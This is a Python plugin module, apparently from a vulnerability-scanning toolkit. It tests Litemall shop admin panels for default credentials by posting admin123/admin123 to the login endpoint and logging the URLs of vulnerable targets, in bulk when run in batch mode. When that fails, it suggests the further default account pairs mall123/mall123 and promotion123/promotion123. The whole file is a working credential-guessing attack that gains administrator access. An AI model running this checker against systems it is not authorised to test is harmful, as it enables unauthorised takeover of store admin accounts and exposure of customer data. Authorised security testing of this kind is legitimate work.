#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Litemall_RuoKouLin_Scan:
    def run(self,input_url):
        try:
            url = input_url
            data = {"username": "admin123", "password": "admin123"}
            req = requests.post(url, json=data, headers=self.headers, proxies=self.proxy, verify=self.ssl)
            if "nickName" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Litemall", '目标存在Litemall弱口令漏洞')
                    OutPrintInfo("Litemall", url)
                    OutPrintInfo("Litemall", "admin123/admin123")
                else:
                    OutPrintInfoSuc("Litemall", f'目标存在Litemall弱口令漏洞: {url}')
                    OutPutFile("litemall_ruokoulin.txt",f'目标存在Litemall弱口令漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Litemall", f'目标 {input_url} 不存在Litemall弱口令漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Litemall",'目标请求出错')
            return False
    def run2(self,input_url):
        try:
            url = input_url + "/admin/auth/login"
            data = {"username": "admin123", "password": "admin123"}
            req = requests.post(url,json=data, headers=self.headers, proxies=self.proxy, verify=self.ssl)

            if "nickName" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Litemall", '目标存在Litemall弱口令漏洞')
                    OutPrintInfo("Litemall", url)
                    OutPrintInfo("Litemall", "admin123/admin123")
                else:
                    OutPrintInfoSuc("Litemall", f'目标存在Litemall弱口令漏洞: {url}')
                    OutPutFile("litemall_ruokoulin.txt",f'目标存在Litemall弱口令漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Litemall", f'目标 {input_url} 不存在Litemall弱口令漏洞')
                    OutPrintInfo("Litemall", '可尝试其它账户测试:mall123/mall123 | promotion123/promotion123')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Litemall",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Litemall", '开始检测Litemall弱口令漏洞...')
        if self.run(url):
            return
        else:
            self.run2(url)
        if not self.batch:
            OutPrintInfo("Litemall", 'Litemall弱口令漏洞检测结束')


